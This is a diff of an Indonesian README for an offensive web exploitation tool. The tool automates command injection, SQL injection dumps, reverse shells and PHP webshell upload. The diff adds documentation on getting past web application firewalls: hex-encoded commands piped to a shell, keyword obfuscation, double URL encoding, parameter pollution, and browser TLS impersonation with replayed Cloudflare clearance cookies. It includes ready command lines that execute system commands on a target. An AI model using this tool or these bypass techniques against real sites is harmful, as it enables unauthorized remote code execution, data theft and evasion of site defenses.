@@ -6,14 +6,64 @@ tipe kerentanan web: **command injection (RCE)**, **SQL injection (dump)**,
 **CORS/CRLF**, **blind OOB**, **directory/traversal**, plus **recon**
 (subdomain + crawl) dan **auto-exploit**.
 
+> Berjalan di **Windows** dan **Linux**. Detail platform ada di bagian
+> [Dukungan Platform](#dukungan-platform-windows--linux).
+
+## Dukungan Platform (Windows / Linux)
+
+- **CLI & GUI** berjalan di kedua OS (GUI butuh `python3-tk` di Linux, atau
+  `tkinter` bawaan Python di Windows; tanpa GUI otomatis fallback ke CLI).
+- **Mesin SQLi `zyra-sqli`** memakai launcher Python lintas-platform
+  (`tools/bin/zq-dbstrike.py`), jadi berjalan penuh di Windows & Linux.
+- **Binari Go** (`zq-radar`, `zq-fuzzer`, `zq-hunter`) adalah ELF **Linux-only**
+  (stripped, tanpa source — tidak bisa di-rebuild). Di Windows tool otomatis
+  mendeteksi dan **melewati** binari itu lalu memakai implementasi **native
+  Python** (crt.sh + brute DNS, multi-vuln scan, dir fuzz internal) — semua
+  tetap berfungsi, `--tools` menampilkan status mesin yang aktif.
+- `--listen` memakai `nc`/`ncat` bila ada; kalau tidak (sering di Windows),
+  otomatis berganti ke **listener Python** bawaan (raw TCP).
+- BANNER & log non-ASCII dipaksa UTF-8 (`_fix_console()`), jadi aman di
+  console Windows ber-codepage cp1252.
+
 ## Installasi (package + launcher `zqrya`)
 
-```bash
-# dari root project
+### Windows
+
+```powershell
+# 1. Install Python 3.8+ dari https://python.org (centang "Add to PATH")
+python --version
+
+# 2. Install package (dari folder project)
 pip install .
 
 # atau mode editable untuk pengembangan
 pip install -e .
+
+# 3. (opsional) tak perlu nc/ncat — listener Python dipakai otomatis
+```
+
+Catatan Windows:
+- Launcher tersedia sebagai `zqrya` (lewat pip, otomatis jadi `zqrya.exe`),
+  atau langsung `python zqrya.py` dari source checkout.
+- Mesin SQLi `zyra-sqli` jalan penuh (`tools/bin/zq-dbstrike.py`).
+- Binari Go (radar/fuzzer/hunter) hanya untuk Linux — di Windows tool otomatis
+  memakai fallback native Python.
+
+### Linux
+
+```bash
+# 1. Dependensi sistem (GUI Tkinter; tanpa ini tool tetap jalan mode CLI)
+sudo apt install -y python3 python3-tk   # Debian/Ubuntu
+#   Fedora: sudo dnf install python3 python3-tkinter
+
+# 2. Install package (dari folder project)
+pip3 install .
+
+# atau mode editable untuk pengembangan
+pip3 install -e .
+
+# 3. (opsional) untuk mesin Go & listener nc
+sudo apt install -y nmap netcat-openbsd   # ncat + nc
 ```
 
 Setelah terpasang, tersedia launcher `zqrya` (plus `python -m zqrya_exploit`
@@ -31,7 +81,7 @@ zqrya_exploit/
   __init__.py        # versi + entry point `main`
   __main__.py        # python -m zqrya_exploit
   core.py            # seluruh engine scanner/exploiter
-  tools/             # mesin vendored (zq-radar, zq-fuzzer, zq-hunter, zq-dbstrike)
+  tools/             # mesin vendored (zq-radar, zq-fuzzer, zq-hunter, zyra-sqli/dbstrike)
   wordlist.txt       # wordlist fuzz bawaan
 setup.py / pyproject.toml / MANIFEST.in   # build & bundling
 ```
@@ -130,6 +180,15 @@ python zqrya.py
 2. Pilih **Scan Shell Injection** / **Scan Directory / Traversal**, atau
    **Run Command (Inject)** untuk mencari parameter rentan lalu mengeksekusi
    command berulang lewat dialog.
+3. Panel **Mesin Tools** menyediakan semua tool vendored langsung dari GUI
+   (fallback otomatis ke implementasi native bila mesin tidak ada):
+   - **Hunter (Subdomain)** — enumerasi subdomain.
+   - **Radar (Mass Scan)** — scan vuln massal berbasis template.
+   - **Fuzzer (Dirscan)** — fuzz direktori (pakai isi field Wordlist).
+   - **SQLi Full (zyra-sqli)** — SQL injection dump penuh via mesin dbstrike.
+   - **Reverse Shell** — prompt LHOST/LPORT/tipe lalu luncurkan payload.
+   - **Web Shell** — upload PHP webshell inline ke path target.
+   - **Update Payloads** — unduh payload PayloadsAllTheThings ke `./payloads/`.
 
 ### CLI (tanpa display / container)
 
@@ -139,7 +198,7 @@ Bisa juga dipaksa dengan flag `--cli`:
 ```bash
 python zqrya.py --cli http://localhost/vuln.php?cmd=id --mode all
 # mode: injection | directory | all | sqli | ssti | ssrf | lfi | xxe
-#       | redirect | headers | oob | recon
+#       | redirect | headers | smuggling | oob | recon | xss
 ```
 
 SQLi dump penuh + query arbitrer:
@@ -217,6 +276,76 @@ Selain encoding transport, mode exploit juga mencoba command yang di-hex-encode
 (`printf <hex> | xxd -r -p | sh` dan `bash -c $'\x..'`) untuk bypass filter
 karakter pada command itu sendiri.
 
+### Mode WAF (`--waf`)
+
+Bila target berada di belakang WAF (banyak respons `403`), jalankan dengan `--waf`.
+Ini shortcut `--encode auto`: tool otomatis mencoba `none → url → double-url →
+hex → double-hex` untuk tiap payload, termasuk varian bypass keyword
+(quote-obfuscation `e''c''h''o`, backslash-escape, `${IFS}`) dan separator tanpa
+`;` (newline/CRLF/tab).
+
+```bash
+# Deteksi + exploit menembus WAF (klasik: WAF single-decode, aplikasi double-decode)
+python zqrya.py --cli http://target/?cmd=id --mode injection --waf
+python zqrya.py --cli http://target/?cmd=id --exec "id; uname -a" --waf
+```
+
+Saat deteksi gagal, tool mencetak peringatan "kemungkinan diblokir WAF" dan
+menyarankan `--waf` / `--encode auto`. Contoh bypass yang terverifikasi: WAF yang
+memblokir `;|&`, backtick, `$()`, karakter kontrol, dan keyword command di posisi
+command — ditembus via `--encode url` (double-encode di wire → WAF hanya decode
+sekali sehingga tidak melihat separator/command-position keyword, sementara
+aplikasi yang double-decode menerima payload asli).
+
+### Cloudflare & AWS WAF (`--impersonate`, `--proxy`, `--cookie`)
+
+WAF ketat Cloudflare/AWS punya dua lapis: **rules engine** (yang menormalisasi &
+meng-decode URL) dan **bot detection** (TLS/JA3-fingerprint, HTTP/2 fingerprint,
+challenge). Payload obfuscation saja sering tidak cukup; tool menyediakan tiga
+mekanisme tambahan:
+
+| opsi           | kegunaan                                                     |
+|----------------|--------------------------------------------------------------|
+| `--waf`        | bypass rules engine: auto-coba encoding + payload obfuscation |
+| `--impersonate BROWSER` | impersonasi TLS/HTTP2 ala browser (butuh `pip install curl_cffi`). Mencegah blokir bot-detection Cloudflare / AWS Bot Control |
+| `--proxy URL`  | route semua request via proxy (Burp/mitmproxy/rotating) untuk ganti IP & inspeksi |
+| `--cookie "cf_clearance=..."` | teruskan cookie dari browser (solusi challenge Cloudflare: selesaikan challenge di browser → salin cookie → jalankan tool) |
+
+```bash
+pip install curl_cffi   # sekali, untuk --impersonate
+
+# Deteksi + RCE menembus Cloudflare-class WAF
+python zqrya.py --cli https://target/?cmd=id --waf --impersonate chrome \
+                --proxy http://127.0.0.1:8080
+python zqrya.py --cli https://target/?cmd=id --exec "id; uname -a" \
+                --waf --impersonate chrome --cookie "cf_clearance=abc123"
+```
+
+### Tamper payload (`--tamper`)
+
+Untuk WAF rules-engine yang lolos dari variasi encoding saja, tambahkan tamper.
+Ini **ditumpuk** dengan `--encode` (auto-coba kombinasi encode × tamper):
+
+| tamper       | cara                                                    |
+|--------------|---------------------------------------------------------|
+| `hpp`        | HTTP Parameter Pollution: `?cmd=SAFE&cmd=PAYLOAD` — banyak WAF hanya cek kemunculan pertama, aplikasi (mis. PHP) memakai nilai terakhir |
+| `whitespace` | ganti spasi dengan TAB (whitespace valid di shell, lolos filter yang blokir `%20`/`+`) |
+| `all`        | coba none, whitespace, dan hpp untuk tiap payload       |
+
+```bash
+python zqrya.py --cli https://target/?cmd=id --mode injection --waf --tamper all
+python zqrya.py --cli https://target/?cmd=id --exec "id" --tamper hpp
+```
+
+Header default sudah ala browser (sec-ch-ua, accept-language, dll.). Saat
+respons berupa halaman challenge Cloudflare ("Just a moment", cf-mitigated),
+tool mencetak peringatan dan menyarankan `--cookie` + `--impersonate`.
+
+> Catatan jujur: tidak ada bypass universal untuk Cloudflare/AWS yang
+> dikonfigurasi ketat. Kombinasi di atas menaikkan peluang dengan meniru browser
+> dan mengakali rules engine, tetapi efektivitas tetap tergantung konfigurasi
+> WAF, origin (apakah double-decode), dan kebijakan challenge site target.
+
 ## Struktur Folder
 
 ```
@@ -228,13 +357,14 @@ zqrya_exploit/
   __main__.py                 # python -m zqrya_exploit
   core.py                     # engine utama (scanner + exploiter)
   wordlist.txt                # wordlist fuzz bawaan
-  tools/
-    dbstrike/                 # mesin serangan database zyra-sqli (SQLi full, Python)
-    bin/
-      zq-dbstrike             # launcher mesin zyra-sqli (Python)
-      zq-radar                # binary mesin radar — recompile dari source (deteksi massal)
-      zq-fuzzer               # binary mesin fuzzer — recompile dari source (fuzz direktori)
-      zq-hunter               # binary mesin hunter — recompile dari source (enumerasi subdomain)
+tools/
+      dbstrike/                 # mesin serangan database zyra-sqli (SQLi full, Python)
+      bin/
+        zq-dbstrike.py          # launcher lintas-platform mesin zyra-sqli (Python)
+        zq-dbstrike.cmd         # launcher Windows (opsional, memanggil zq-dbstrike.py)
+        zq-radar                # binary mesin radar (Linux) — recompile dari source (deteksi massal)
+        zq-fuzzer               # binary mesin fuzzer (Linux) — recompile dari source (fuzz direktori)
+        zq-hunter               # binary mesin hunter (Linux) — recompile dari source (enumerasi subdomain)
 payloads/                     # payload PayloadsAllTheThings (hasil --update-payloads)
 reports/                      # laporan output
 ```
@@ -242,8 +372,9 @@ reports/                      # laporan output
 Tiga mesin Go (`zq-radar`, `zq-fuzzer`, `zq-hunter`) sudah **di-recompile dari
 source** dengan identitas sendiri (banner, nama, config dir, version) — bukan
 wrapper lagi. Mesin Python `zyra-sqli` (vendor `dbstrike`) di-launch lewat
-`zq-dbstrike`. Flag `--dbstrike`, `--radar`, `--fuzzer`, `--hunter` otomatis
-pakai mesin vendored bila ada, dan fallback ke implementasi native bila tidak.
+launcher lintas-platform `zq-dbstrike.py` (Windows & Linux). Flag `--dbstrike`,
+`--radar`, `--fuzzer`, `--hunter` otomatis pakai mesin vendored bila ada, dan
+fallback ke implementasi native bila tidak.
 
 ## Mode Otomatis Penuh (`--auto`)
 
@@ -268,8 +399,22 @@ python zqrya.py --cli https://target/vuln.php?id=1 --dbstrike   # zyra-sqli: SQL
 python zqrya.py --cli https://target.com --fuzzer --wordlist wordlist.txt  # fuzzer: fuzz dir
 ```
 
+Flag tambahan untuk mesin tertentu bisa diteruskan apa adanya via `--tool-args`
+(string di-shell-split lalu ditempel ke argumen mesin):
+
+```bash
+python zqrya.py --cli https://target/vuln.php?id=1 --dbstrike \
+    --tool-args "--dump --threads 8"          # dump penuh + 8 thread
+python zqrya.py --cli https://target.com --radar \
+    --tool-args "-severity critical"          # hanya severity critical
+python zqrya.py --cli https://target.com --fuzzer \
+    --tool-args "-mr 'Response contains login'"  # filter konten respons
+```
+
 Kalau mesin vendored tidak ada, tool otomatis fallback ke implementasi native
 (crt.sh + brute DNS, multi-vuln scan, UNION+blind SQLi dump, dir fuzz internal).
+Di **Windows**, binari Go Linux dilewati dan native fallback dipakai otomatis
+(lihat [Dukungan Platform](#dukungan-platform-windows--linux)).
 
 ## Recon: subdomain → crawl → scan → auto-exploit
 
@@ -390,9 +535,9 @@ tabel findings + log).
 **GUI** — klik tombol **Save Report** setelah scan selesai, pilih lokasi dan
 format (`.html`, `.txt` atau `.json`). GUI juga punya dropdown **Mode**
 (all/injection/sqli/ssti/ssrf/xss/lfi/xxe/redirect/headers/smuggling/directory/oob/recon),
-tombol **Run Scan
-(Mode)**, **SQLi Dump**, **Run Command (Inject)**, dan **Encoding** — jadi
-fungsinya setara dengan CLI.
+tombol **Run Scan (Mode)**, **SQLi Dump**, **Run Command (Inject)**, panel
+**Mesin Tools** (Hunter/Radar/Fuzzer/zyra-sqli/Reverse Shell/Web Shell/Update
+Payloads), dan **Encoding** — jadi fungsinya setara dengan CLI.
 
 > Catatan: jika `requests` tidak terpasang, tool otomatis fallback ke
 > `urllib` bawaan Python.
